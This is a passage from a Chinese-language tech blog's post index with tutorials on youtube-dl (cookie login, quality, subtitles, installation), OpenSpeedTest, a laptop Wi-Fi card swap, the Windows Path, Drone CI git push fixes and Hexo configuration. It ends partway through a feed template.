youtube-dl 有提供輸入簡單的帳號密碼的參數 -u, --username USERNAME 輸入帳號 -p, --password PASSWORD 輸入密碼 範例 youtube-dl --username &quot;your_mail@gmail.com&quot; --password &quot;P@ssw0rd&quot; &quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot; 目前只剩部分網站可以用這種方法登入。Google 有更新過 youtube 帳號的取用安全性，只能用下面的 Cookie 方式登入。 使用 Cookie 登入Youtube-dl 可以使用 Netscape 格式的 cookie 檔案，讓伺服器端認定為已登入帳號的瀏覽器 匯出 cookie我們可以用 EditThisCookie 幫我們匯出 Cookie EditThisCookie Chrome擴充商店 安裝完後，進入 EditThisCookie 的設定 將輸出格式選擇 Netscape 格式 接著建立 cookie.txt 文字檔 建立完後我們到 https://youtube.com用 EditThisCookie 插件的匯出功能複製所有 cookie 將複製到的文字貼到 cookie.txt 貼完後照前面的步驟，抓出 https://accounts.google.com 的 cookie 都完成後 cookie.txt 大概會長這個樣子 # Netscape HTTP Cookie File# http://curl.haxx.se/rfc/cookie_spec.html# This file was generated by Cookie Editor.youtube.com TRUE / TRUE 1712544730 __Secure-1PAPISID XXXXX.youtube.com TRUE / TRUE 1712544730 __Secure-1PSID XXXXX.youtube.com TRUE / TRUE 1712544730 __Secure-3PAPISID XXXXX.youtube.com TRUE / TRUE 1712544730 __Secure-3PSID XXXXX.youtube.com TRUE / TRUE 1681127908 __Secure-3PSIDCC XXXXX.youtube.com TRUE / FALSE 1687764170 _ga XXXXX.youtube.com TRUE / FALSE 1654529554 _gcl_au XXXXX.youtube.com TRUE / FALSE 1712544730 APISID XXXXX.youtube.com TRUE / FALSE 1712544730 HSID XXXXX.youtube.com TRUE / TRUE 1664713150 LOGIN_INFO XXXXX.youtube.com TRUE / TRUE 1712663916 PREF XXXXX.youtube.com TRUE / TRUE 1712544730 SAPISID XXXXX.youtube.com TRUE / FALSE 1712544730 SID XXXXX..youtube.com TRUE / FALSE 1681127908 SIDCC XXXXX.youtube.com TRUE / TRUE 1712544730 SSID XXXXX.youtube.com TRUE / TRUE 1665142416 VISITOR_INFO1_LIVE XXXXX.youtube.com TRUE / FALSE 0 wide 0.youtube.com TRUE / TRUE 0 YSC XXXXX# Netscape HTTP Cookie File# http://curl.haxx.se/rfc/cookie_spec.html# This file was generated by Cookie Editor.google.com TRUE / TRUE 1712494597 __Secure-1PAPISID XXXXX.google.com TRUE / TRUE 1712494597 __Secure-1PSID XXXXX.google.com TRUE / TRUE 1712494597 __Secure-3PAPISID XXXXX.google.com TRUE / TRUE 1712494597 __Secure-3PSID XXXXX.google.com TRUE / TRUE 1681128005 __Secure-3PSIDCC XXXXX.google.com TRUE / TRUE 1652183330 1P_JAR XXXXX.google.com TRUE / TRUE 1663206405 AEC XXXXX.google.com TRUE / FALSE 1712494597 APISID XXXXX.google.com TRUE / FALSE 1712494597 HSID XXXXX.google.com TRUE / TRUE 1665402835 NID XXXXX.google.com TRUE / FALSE 1651150185 OGP XXXXX.google.com TRUE / FALSE 1651150184 OGPC XXXXX.google.com TRUE / TRUE 1712494597 SAPISID XXXXX.google.com TRUE / FALSE 1712494597 SID XXXXX.google.com TRUE / FALSE 1681128005 SIDCC XXXXX.google.com TRUE / TRUE 1712494597 SSID XXXXXmyaccount.google.com FALSE / TRUE 1712544729 __Secure-OSID XXXXXmyaccount.google.com FALSE / TRUE 1712544729 OSID XXXXXmyaccount.google.com FALSE / TRUE 1652064730 OTZ XXXXX 重整格式接著我們將剛剛的 cookie.txt 用 curl 重新整理格式 curl -b cookie.txt --cookie-jar ytcookie.txt &#x27;https://youtube.com&#x27; 若是 Windows 的用戶，可以使用 Windows subsystem linux 2 (WSL2) 跑 Linux 的程式 執行完後 cookie.txt 就可以刪了，我們只要 ytcookie.txt 這個檔案 ytcookie.txt 要取甚麼名字都可以 使用 cookie 登入用 --cookie 設定我們剛剛做好的 ytcookie.txt 就可以了 youtube-dl --cookie ./ytcookie.txt &quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot; 接下來只要你沒在瀏覽器內登出帳號，ytcookie.txt 理論上就能一直使用 當然，網站那邊可能也會紀錄是這個帳號在下載影片… ↩️回總教學文","categories":[{"name":"小工具","slug":"小工具","permalink":"https://zonego.tw/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://zonego.tw/tags/Windows/"},{"name":"Linux","slug":"Linux","permalink":"https://zonego.tw/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://zonego.tw/tags/Mac/"}]},{"title":"youtube-dl 指定下載影片畫質","slug":"youtube-dl-quality","date":"2022-04-10T08:29:20.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2022/04/10/youtube-dl-quality/","link":"","permalink":"https://zonego.tw/2022/04/10/youtube-dl-quality/","excerpt":"","text":"↩️回總教學文選擇畫質youtube-dl 預設會下載最高畫質的版本，不一定是 mp4 格式 列出可下載的畫質: youtube-dl -F https://www.youtube.com/watch?v=dQw4w9WgXcQ[youtube] dQw4w9WgXcQ: Downloading webpage[info] Available formats for dQw4w9WgXcQ:format code extension resolution note249 webm audio only tiny 46k , webm_dash container, opus @ 46k (48000Hz), 1.18MiB250 webm audio only tiny 61k , webm_dash container, opus @ 61k (48000Hz), 1.55MiB140 m4a audio only tiny 129k , m4a_dash container, mp4a.40.2@129k (44100Hz), 3.27MiB251 webm audio only tiny 129k , webm_dash container, opus @129k (48000Hz), 3.28MiB394 mp4 256x144 144p 68k , mp4_dash container, av01.0.00M.08@ 68k, 25fps, video only, 1.72MiB160 mp4 256x144 144p 71k , mp4_dash container, avc1.4d400c@ 71k, 25fps, video only, 1.81MiB278 webm 256x144 144p 89k , webm_dash container, vp9@ 89k, 25fps, video only, 2.27MiB133 mp4 426x240 240p 117k , mp4_dash container, avc1.4d4015@ 117k, 25fps, video only, 2.96MiB395 mp4 426x240 240p 134k , mp4_dash container, av01.0.00M.08@ 134k, 25fps, video only, 3.40MiB242 webm 426x240 240p 159k , webm_dash container, vp9@ 159k, 25fps, video only, 4.02MiB134 mp4 640x360 360p 219k , mp4_dash container, avc1.4d401e@ 219k, 25fps, video only, 5.55MiB396 mp4 640x360 360p 262k , mp4_dash container, av01.0.01M.08@ 262k, 25fps, video only, 6.64MiB243 webm 640x360 360p 273k , webm_dash container, vp9@ 273k, 25fps, video only, 6.92MiB135 mp4 854x480 480p 337k , mp4_dash container, avc1.4d401e@ 337k, 25fps, video only, 8.52MiB244 webm 854x480 480p 397k , webm_dash container, vp9@ 397k, 25fps, video only, 10.04MiB397 mp4 854x480 480p 450k , mp4_dash container, av01.0.04M.08@ 450k, 25fps, video only, 11.38MiB136 mp4 1280x720 720p 655k , mp4_dash container, avc1.4d401f@ 655k, 25fps, video only, 16.57MiB247 webm 1280x720 720p 699k , webm_dash container, vp9@ 699k, 25fps, video only, 17.67MiB398 mp4 1280x720 720p 858k , mp4_dash container, av01.0.05M.08@ 858k, 25fps, video only, 21.70MiB399 mp4 1920x1080 1080p 1576k , mp4_dash container, av01.0.08M.08@1576k, 25fps, video only, 39.84MiB137 mp4 1920x1080 1080p 3546k , mp4_dash container, avc1.640028@3546k, 25fps, video only, 89.64MiB18 mp4 640x360 360p 630k , avc1.42001E, 25fps, mp4a.40.2 (44100Hz), 15.95MiB (best) 選好要下載的格式，把 format code 填入參數 -f 裡 youtube-dl -f 137 https://www.youtube.com/watch?v=dQw4w9WgXcQ# 1920x1080 影片 + 129K音軌# 需要先裝 ffmpegyoutube-dl -f &quot;137+140&quot; https://www.youtube.com/watch?v=dQw4w9WgXcQ 如果懶得查，也可以直接指定某種影片、音樂最高品質 # 下載 MP4 格式中最高畫質，或是其他格式中的最高畫質youtube-dl -f &#x27;bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best&#x27; url# 指定最佳畫質，但不要高於 480pyoutube-dl -f &#x27;bestvideo[height&lt;=480]+bestaudio/best[height&lt;=480]&#x27; url# 下載檔案大小小於 50M 的最高畫質影片youtube-dl -f &#x27;best[filesize&lt;50M]&#x27; url 指定格式、品質時，若網站沒有會下載失敗 ↩️回總教學文","categories":[{"name":"小工具","slug":"小工具","permalink":"https://zonego.tw/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://zonego.tw/tags/Windows/"},{"name":"Linux","slug":"Linux","permalink":"https://zonego.tw/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://zonego.tw/tags/Mac/"}]},{"title":"youtube-dl 下載字幕","slug":"youtube-dl-subtitle","date":"2022-04-10T08:13:43.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2022/04/10/youtube-dl-subtitle/","link":"","permalink":"https://zonego.tw/2022/04/10/youtube-dl-subtitle/","excerpt":"","text":"↩️回總教學文參數 --list-subs：列出可下載的所有字幕 --write-sub：儲存字幕 --write-auto-sub: 儲存自動翻譯的字幕，限 youtube 可以使用 --embed-sub：將字幕合併至影片中，需搭配 –write-sub 參數使用 --all-subs：下載所有字幕 --sub-format：下載的字幕格式，如果原影片沒有指定的字幕格式會去下載其他格式的字幕 --sub-lang：選擇要下載的字幕語言，用逗號分隔，例如：zh_TW,ja --convert-subs：將下載的字幕轉換成其他格式，目前支援 srt|ass|vtt|lrc 列出所有可用字幕youtube-dl --list-subs https://www.youtube.com/watch?v=AJYsA1jXf60[youtube] AJYsA1jXf60: Downloading webpageAvailable automatic captions for AJYsA1jXf60:Language formatstg vtt, ttml, srv3, srv2, srv1af vtt, ttml, srv3, srv2, srv1...vi vtt, ttml, srv3, srv2, srv1zh-Hant vtt, ttml, srv3, srv2, srv1... 下載影片與字幕如果我要下載繁中以及英文的字幕，並另存成 .srt 格式 youtube-dl --sub-lang zh-Hant,en --write-sub --convert-subs srt https://www.youtube.com/watch?v=AJYsA1jXf60 只下載字幕可以加 --skip-download 跳過下載影片 youtube-dl --sub-lang zh-Hant,en --write-sub --convert-subs srt --skip-download https://www.youtube.com/watch?v=AJYsA1jXf60 下載自動翻譯字幕下面指令為下載自動翻譯的繁體中文字幕 youtube-dl --write-auto-sub --sub-lang zh-Hant https://www.youtube.com/watch?v=R_BlrlAcOoQ ↩️回總教學文","categories":[{"name":"小工具","slug":"小工具","permalink":"https://zonego.tw/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://zonego.tw/tags/Windows/"},{"name":"Linux","slug":"Linux","permalink":"https://zonego.tw/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://zonego.tw/tags/Mac/"}]},{"title":"OpenSpeedTest 純HTML5的內網測速工具","slug":"SpeedTest","date":"2022-03-15T10:46:58.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2022/03/15/SpeedTest/","link":"","permalink":"https://zonego.tw/2022/03/15/SpeedTest/","excerpt":"大家平常要測網路速度都會想到 Ookla 的 Speedtest.net 在簡單的網路環境內，Speedtest 就可以完成測速的工作 但如果我要測試內網速度呢?","text":"大家平常要測網路速度都會想到 Ookla 的 Speedtest.net 在簡單的網路環境內，Speedtest 就可以完成測速的工作 但如果我要測試內網速度呢? 網路環境在測試之前，我們先了解網路速度到底是在測甚麼 一般家用的網路架構大概如圖，由中華電信這些電信商(ISP) 提供網際網路連線(雲圖示) 之後在你家裝一台路由器，讓家裡的設備可以透過它上網 我們平常用的 Speedtest.net 其實就是在測家裡到網際網路的連線速度 只是因為網路架構相當簡單，所以電腦、手機等終端的連線速度就等於連網際網路的速度 若是有在玩自架 homelab 的朋友網路架構絕對沒那麼簡單，可能比較像這張圖 在接到網際網路(後面以外網代稱)之前 接到路由器 Router 架設區域網路(後面以內網代稱) 然後連交換機 Switch 去串接各終端設備和伺服器、監視器等 所以如果我們要測試內網裡面電腦連伺服器的速度 如下圖 Speedtest.net 當然就測不出來了 OpenSpeedTest講了這麼多前提，主要就是要紹可以自己架設的 OpenSpeedTest 官網 DockerHub 只要把它架在自己的伺服器上，就可以像在用 Speedtest.net 一樣測試內網的網速🎉 這邊是官方那邊的 DEMO (沒錯它可以直接嵌在你的網頁內) Provided by OpenSpeedtest.com 安裝 OpenSpeedTestOpenSpeedTest 大致分為3種安裝方式 安裝程式包 Docker 從原始碼手動架設 程式包官方打包好的安裝檔在這邊下載頁可以找到 支援主流的作業系統 Windows, Mac, Linux 之外 連 Android 跟 IOS 都有 用來測熱點性能? 點 Start Server 後就可以連 👉 給的的網址測速了 Dockerdocker run --restart=unless-stopped --name openspeedtest -d -p 3000:3000 -p 3001:3001 openspeedtest/latest 啟動後連 http://YOUR-IP:3000 或 https://YOUR-IP:3001 測速 原始碼安裝首先到 Github 下載或 clone 原始碼 準備好 Nginx ，套用這邊 然後將下載好的OpenSpeedTest原始碼，放到 Nginx 的網頁資料夾就可以用了 要長期使用，推薦還是用 Docker 安裝，簡單省事","categories":[{"name":"小工具","slug":"小工具","permalink":"https://zonego.tw/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Self-Hosting","slug":"Self-Hosting","permalink":"https://zonego.tw/tags/Self-Hosting/"},{"name":"網路","slug":"網路","permalink":"https://zonego.tw/tags/%E7%B6%B2%E8%B7%AF/"},{"name":"Windows","slug":"Windows","permalink":"https://zonego.tw/tags/Windows/"},{"name":"Linux","slug":"Linux","permalink":"https://zonego.tw/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://zonego.tw/tags/Mac/"}]},{"title":"ASUS VivoBook S14 S433 更換無線網卡","slug":"vivobook-s14-netcard","date":"2022-01-17T12:20:36.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2022/01/17/vivobook-s14-netcard/","link":"","permalink":"https://zonego.tw/2022/01/17/vivobook-s14-netcard/","excerpt":"","text":"去年大概在10月左右買了 ASUS VivoBook S14 (S433)，起初用著都很正常 12月開始出現偶發的藍屏崩潰、網卡抓不到等現象 自從大學開始，電腦都是自己組以來，不知道已經有幾年沒看過這麼頻繁出現的藍屏… 爬文後才發現，大概是因為晶片短缺的原因，ASUS 這幾個月的筆電網卡會採用替代品，而不是之前常用的 Intel AX210 Intel 他們家的網卡跟 SSD 可是出了名的穩定耐用 趁著缺貨前趕快從某皮買一張 AX210 來換 警告! 自行更換網卡可能會破保固，換之前請想好 事前準備 Intel AX210 網卡一張 星型螺絲起子 建議可以買XX合1那種螺絲起子組 尖頭鑷子 拆機 參考別人的拆機影片，把背蓋打開就看的到網卡了 紅框的地方就是網卡，天線用鑷子會比較好拆裝 換下的網卡 AW-XB468NF 這張卡請保留好，之後要如果送修 需要在送修前先換回去，以免保固出問題 都裝好了才發現忘記拍照…","categories":[{"name":"DIY","slug":"DIY","permalink":"https://zonego.tw/categories/DIY/"}],"tags":[{"name":"DIY","slug":"DIY","permalink":"https://zonego.tw/tags/DIY/"}]},{"title":"Windows 11 環境變數及 Path 設定","slug":"windows11-path","date":"2022-01-07T02:52:56.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2022/01/07/windows11-path/","link":"","permalink":"https://zonego.tw/2022/01/07/windows11-path/","excerpt":"","text":"設定環境變數開啟設定 &gt; 系統 &gt; 關於 &gt; 裝置規格 進階系統設定 設定 Path預設位置Windows預設應用程式 path 位置 %USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps 題外話 Linux 的預設位置在 /usr/local/bin 為甚麼要設定 Path設定路徑可以簡化找程式的時間 例如下載完 youtube-dl.exe 放在下載資料夾內時在指令介面，可以直接打程式名，不用附帶前面的路徑 # 未設定路徑C:\\Users\\th533\\Downloads\\youtube-dl.exe ...# 有設定路徑youtube-dl.exe ... 新增、編輯 Path","categories":[{"name":"系統設定","slug":"系統設定","permalink":"https://zonego.tw/categories/%E7%B3%BB%E7%B5%B1%E8%A8%AD%E5%AE%9A/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://zonego.tw/tags/Windows/"},{"name":"環境變數","slug":"環境變數","permalink":"https://zonego.tw/tags/%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/"}]},{"title":"drone-git-push 踩雷心得","slug":"drone-git-push","date":"2022-01-06T12:15:54.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2022/01/06/drone-git-push/","link":"","permalink":"https://zonego.tw/2022/01/06/drone-git-push/","excerpt":"Drone CI 是一個可以自行的 CI (Continuous Integration) 軟體 使用 CI 的用意就是為了，能在寫完程式時，自動測試、編譯與發佈程式。","text":"Drone CI 是一個可以自行的 CI (Continuous Integration) 軟體 使用 CI 的用意就是為了，能在寫完程式時，自動測試、編譯與發佈程式。 關於怎麼架設改天再寫一篇教學。 Google一下應該就很多教學了 drone-git-push回來本篇主題 這次我的需求是在 Drone 的流程內，測試或編譯完程式後以 git 推送到不同的儲藏庫 其實就是要產生網站檔案後，推送到 GitHub 方便用 GitHub Page 或是 Cloudflare Page 在 Drone CI 中可以用 drone-git-push 做到 這次遇到的問題有2個 害我為了找問題多花很多時間 儲存庫辨識失敗錯誤訊息: ...parse \\&quot;git@github.com:user/repo.git\\&quot;: first path segment in URL cannot contain colon&quot;... 照原本文件寫的 .drone.yml 大概是長這樣 - name: deploy git image: appleboy/drone-git-push settings: branch: main remote: git@github.com:user/repo.git force: false commit: true 參考GitHub討論區的解決方法 使用緊急修補的 image remote 改用字串 - name: deploy git image: appleboy/drone-git-push:0.2.0-linux-amd64 settings: branch: main remote: &quot;git@github.com:user/repo.git&quot; force: false commit: true SSH Key 讀取失敗由於資安的關係， SSH KEY 不可以跟著程式碼推送到儲存庫，更不可能放明碼在設定檔中 在 Drone CI 要改用 secret 的功能 .drone.yml 大概長這樣 - name: deploy git image: appleboy/drone-git-push:0.2.0-linux-amd64 settings: branch: main ssh_key: from_secret: githubkey 另外在 Drone CI 的 WebUI 上添加 Secret 將 private key 的內文貼進去 然後就碰到問題了 錯誤訊息: ...Load key &quot;/root/.ssh/id_rsa&quot;: invalid format... 參考GitHub討論區的解決方法 產生的 SSH key 需要改用 PEM ssh-keygen -t rsa -b 4096 -C &quot;your_email@example.com&quot; -m PEM 換完 KEY 甚麼問題都沒了🎉","categories":[{"name":"開發相關","slug":"開發相關","permalink":"https://zonego.tw/categories/%E9%96%8B%E7%99%BC%E7%9B%B8%E9%97%9C/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://zonego.tw/tags/Git/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://zonego.tw/tags/CI-CD/"},{"name":"Drone","slug":"Drone","permalink":"https://zonego.tw/tags/Drone/"}]},{"title":"用指令下載影片吧 youtube-dl","slug":"youtube-dl","date":"2021-12-19T08:45:13.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2021/12/19/youtube-dl/","link":"","permalink":"https://zonego.tw/2021/12/19/youtube-dl/","excerpt":"你想下載 Youtube、Facebook 或是 twitter 上的影片嗎?","text":"你想下載 Youtube、Facebook 或是 twitter 上的影片嗎? 雖然名稱叫 youtube 下載，但 youtube-dl支援的網站 多達一千多個 只要到 這裡 就能下載 對於初學者會卡的地方，大概就只有不熟悉指令界面而已 (可能還有youtube的限速) 甚麼?你說打指令你不會用? 那你可以改用 youtube-dl gui 或是 Hitomi Downloader 詳細教學 指定下載畫質 下載字幕 登入並下載影片 安裝Windows 版本Windows 需要 Microsoft Visual C++ 2010 Service Pack 1 Redistributable Package (x86) https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe 套件連結至微軟網站，請放心服用 安裝後下載 Windows.exe 搬到預設應用程式的位置 %USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps 或是參考這篇 Windows 11 環境變數及 Path 設定 設定路徑(Path)環境變數 使用 CMD, Powershell 或 windows terminal 就可以直接使用 Linux, Mac 版本Linux 及 Mac 需要 Python 2.6, 2.7, 或 3.2+ 以上的版本才能執行 可以到 Python 官網 下載 透過網路下載 youtube-dl sudo curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/local/bin/youtube-dlsudo chmod a+rx /usr/local/bin/youtube-dl 透過 python 安裝 sudo pip install --upgrade youtube_dl Mac 可以透過 Homebrew 安裝 brew install ffmpeg youtube-dl 更新youtube-dl -U Linux 若是用套件管理器(例如 man, apt)安裝，就用套件管理器更新 下載影片# Windowsyoutube-dl.exe &quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot;# Linuxyoutube-dl &quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot; 使用指令介面不像視窗版是點開後才給設定或操作，大多都是先把設定參數都一起寫在啟動指令中 用 Ctrl + C 可以終止執行中的指令 如果網址內有特殊符號，可以用字串標記 “URL” 通常指令介面的程式會保留 -h --help 做使用說明 如果不會操作，可以參考使用說明 下載播放清單下載撥放清單跟下載影片一樣，把網址換成撥放清單 指定播放清單下載範圍 --playlist-start：播放清單起始位置 --playlist-end：播放清單結束位置 --playlist-items：指定範圍，逗號分隔，例如：1,2,5,8, 1-3,7,10-13 只下載音樂用 -x 只輸出音軌，--audio-format 指定輸出檔的格式 youtube-dl -x --audio-format mp3 https://www.youtube.com/watch?v=WI-EMzrUSP4 其他參數： --embed-thumbnail：嵌入影片縮圖(僅限 mp3 和 m4a&#x2F;mp4) --add-metadata：加入影片資訊 參考來源https://github.com/ytdl-org/youtube-dl/blob/master/README.mdhttps://junyussh.github.io/p/use-youtube-dl-to-download-videos/","categories":[{"name":"小工具","slug":"小工具","permalink":"https://zonego.tw/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://zonego.tw/tags/Windows/"},{"name":"Linux","slug":"Linux","permalink":"https://zonego.tw/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://zonego.tw/tags/Mac/"}]},{"title":"Hexo 指定文件跳過渲染","slug":"hexo-skip","date":"2021-12-15T01:41:37.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2021/12/15/hexo-skip/","link":"","permalink":"https://zonego.tw/2021/12/15/hexo-skip/","excerpt":"Hexo 在編譯時，會將source下的md以及html檔，都套用主題後產生成html 若有些頁面原本就是設計好的，不要套用主題的話，就要改設定去跳過了","text":"Hexo 在編譯時，會將source下的md以及html檔，都套用主題後產生成html 若有些頁面原本就是設計好的，不要套用主題的話，就要改設定去跳過了 修改設定詳細請看 Hexo 的官方文件 開啟 _config.yml 修改 skip_render 欄位可以設定渲染時要跳過的文件 這邊的設定與 exclude 不同，用 exclude 排除後，在編譯時不會將原檔複製到 public 內，包括佈署時也是。 跳過單一文件若要跳過 source 下的 test.html skip_render: test.html# 或是skip_render: [test.html]# 或是skip_render:- test.html 若是跳過 source&#x2F;abc 下的 test.html，就寫 abc&#x2F;test.html路徑不要寫成絕對位置，這邊的路徑都寫 source 下的相對位置 跳過多個文件skip_render: [test.html, test2.html]# 或是skip_render:- test.html- test2.html 使用規則命名skip_render 欄位可以用 glob 表達式表示符合規則的檔名 例如: # 跳過所有 test 開頭的檔案skip_render:- test*# 跳過所有 test 開頭的 html 檔案skip_render:- test*.html# 跳過所有 abc 資料夾內的檔案skip_render:- abc/*# 跳過所有 abc 資料夾內的檔案包含目錄skip_render:- abc/** 參考資料https://hexo.io/zh-tw/docs/configuration.htmlhttps://iitii.github.io/2019/02/15/1/","categories":[{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/categories/Blog/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://zonego.tw/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/tags/Blog/"}]},{"title":"開源線上影片下載工具 youtube-dl gui","slug":"youtube-dlg","date":"2021-12-10T13:42:20.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2021/12/10/youtube-dlg/","link":"","permalink":"https://zonego.tw/2021/12/10/youtube-dlg/","excerpt":"你想下載 Youtube、Facebook 或是 twitter 上的影片嗎?","text":"你想下載 Youtube、Facebook 或是 twitter 上的影片嗎? 用 youtube-dl 保證藥到病除 雖然名稱叫youtube下載，但 youtube-dl支援的網站 多達一千多個 如果你需要更多功能，而且不排斥指令介面 那你可以改用 youtube-dl Youtube-dl Gui官網在這 Github youtube-dl gui 目前只有 Windows 版(還有沒中文)，在官網下載 Installer 即可安裝 下載完還是 zip 壓縮檔，需要先解壓縮再安裝 打開之後長這樣 使用前先設定下載位置 把要下載的影片網址貼這裡，一行一個影片 再來選要下載的格式，影片可以選 webp, mp4，音樂可以選 mp3, m4a 新增到下到駐列 開始下載 等到跑完，就可以在資料夾內找到影片檔啦🎉 小抱怨… Youtube 最近好像開始防機器人，下載速度變超慢","categories":[{"name":"小工具","slug":"小工具","permalink":"https://zonego.tw/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://zonego.tw/tags/Windows/"}]},{"title":"增加 Hexo 的 RSS, ATOM, JSON Feed 訂閱功能","slug":"hexo-rss","date":"2021-12-09T05:48:27.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2021/12/09/hexo-rss/","link":"","permalink":"https://zonego.tw/2021/12/09/hexo-rss/","excerpt":"RSS(Really Simple Syndication) 是用 xml 定義的標準格式，用來把新聞、部落格文章或是 Podcast 更新資訊彙整到一個地方 衍生出的格式有 Atom, Json Feed 等格式","text":"RSS(Really Simple Syndication) 是用 xml 定義的標準格式，用來把新聞、部落格文章或是 Podcast 更新資訊彙整到一個地方 衍生出的格式有 Atom, Json Feed 等格式 既然都做部落格了，當然要提供訂閱功能。(加減多點流量) 在 Hexo 內可以使用 Hexo-Feed 插件幫我們產生 RSS, Atom 還有 Json Feed 的檔案 Hexo-feed GitHub 安裝需要版本Hexo 4.X+NodeJS 12+ 安裝指令npm install hexo-feed --save-dev 製作模板檔案新增對應的模板檔案 RSS: themes/layout/template/rss.ejs &lt;?xml version=&quot;1.0&quot;?&gt;&lt;rss version=&quot;2.0&quot;&gt; &lt;channel&gt; &lt;title&gt;&lt;%= config.title %&gt;&lt;%= tag ? ` • Posts by &quot;$&#123;tag&#125;&quot; tag` : &#x27;&#x27; %&gt;&lt;%= category ? ` • Posts by &quot;$&#123;category&#125;&quot; category` : &#x27;&#x27; %&gt;&lt;/title&gt; &lt;link&gt;&lt;%= config.url %&gt;&lt;/link&gt; &lt;description&gt;&lt;%= config.description %&gt;&lt;/description&gt; &lt;language&gt;&lt;%= config.language %&gt;&lt;/language&gt; &lt;pubDate&gt;&lt;%= moment(lastBuildDate).locale(&#x27;en&#x27;).format(&#x27;ddd, DD MMM YYYY HH:mm:ss ZZ&#x27;) %&gt;&lt;/pubDate&gt; &lt;lastBuildDate&gt;&lt;%= moment(lastBuildDate).locale(&#x27;en&#x27;).format(&#x27;ddd, DD MMM YYYY HH:mm:ss ZZ&#x27;) %&gt;&lt;/lastBuildDate&gt; &lt;%_ for (const &#123; name &#125; of (tags || [])) &#123; _%&gt; &lt;category&gt;&lt;%= name %&gt;&lt;/category&gt; &lt;%_ &#125; _%&gt; &lt;%_ for (const post of posts) &#123; _%&gt; &lt;item&gt; &lt;guid isPermalink=&quot;true&quot;&gt;&lt;%= post.permalink %&gt;&lt;/guid&gt; &lt;title&gt;&lt;%= post.title %&gt;&lt;/title&gt; &lt;link&gt;&lt;%= post.permalink %&gt;&lt;/link&gt; &lt;%_ for (const tag of (post.tags ? post.tags.toArray() : [])) &#123; _%&gt; &lt;category&gt;&lt;%= tag.name %&gt;&lt;/category&gt; &lt;%_ &#125; _%&gt; &lt;pubDate&gt;&lt;%= moment(post.date).locale(&#x27;en&#x27;).format(&#x27;ddd, DD MMM YYYY HH:mm:ss ZZ&#x27;) %&gt;&lt;/pubDate&gt; &lt;description&gt;&lt;![CDATA[ &lt;%= post.content %&gt; ]]&gt;&lt;/description&gt; &lt;/item&gt; &lt;%_ &#125; _%&gt; &lt;/channel&gt;&lt;/rss&gt; ATOM: themes/layout/template/atom.ejs &lt;?xml version=&quot;1.0&quot;?&gt;&lt;feed xmlns=&quot;http://www.w3.org/2005/Atom&quot;&gt; &lt;id&gt;&lt;%= config.url %&gt;&lt;/id&gt; &lt;title&gt;&lt;%= config.title %&gt;&lt;%= tag ? ` • Posts by &quot;$&#123;tag&#125;&quot; tag` : &#x27;&#x27; %&gt;&lt;%= category ? ` • Posts by &quot;$&#123;category&#125;&quot; category` : &#x27;&#x27; %&gt;&lt;/title&gt; &lt;link href=&quot;&lt;%= config.url %&gt;&quot; /&gt; &lt;updated&gt;&lt;%= moment(lastBuildDate).toISOString() %&gt;&lt;/updated&gt; &lt;%_ for (const &#123; name &#125; of (tags || [])) &#123; _%&gt; &lt;category term=&quot;&lt;%= name %&gt;&quot; /&gt; &lt;%_ &#125; _%&gt; &lt;%_ for (const post of posts) &#123; _%&gt; &lt;entry&gt; &lt;id&gt;&lt;%= post.permalink %&gt;&lt;/id&gt; &lt;title&gt;&lt;%= post.title %&gt;&lt;/title&gt; &lt;link rel=&quot;alternate&quot; href=&quot;&lt;%= post.permalink %&gt;&quot;/&gt; &lt;content type=&quot;html&quot;&gt;&lt;%= post.content %&gt;&lt;/content&gt; &lt;%_ for (const &#123; name &#125; of (post.tags ? post.tags.toArray() : [])) &#123; _%&gt; &lt;category term=&quot;&lt;%= name %&gt;&quot; /&gt; &lt;%_ &#125; _%&gt; &lt;updated&gt;&lt;%= moment(post.date).toISOString() %&gt;&lt;/updated&gt; &lt;/entry&gt; &lt;%_ &#125; _%&gt;&lt;/feed&gt; Json Feed: themes/layout/template/json.ejs &lt;%- JSON.stringify(&#123; version: &#x27;https://jsonfeed.org/version/1&#x27;, title: config.title + (tag ? ` • All 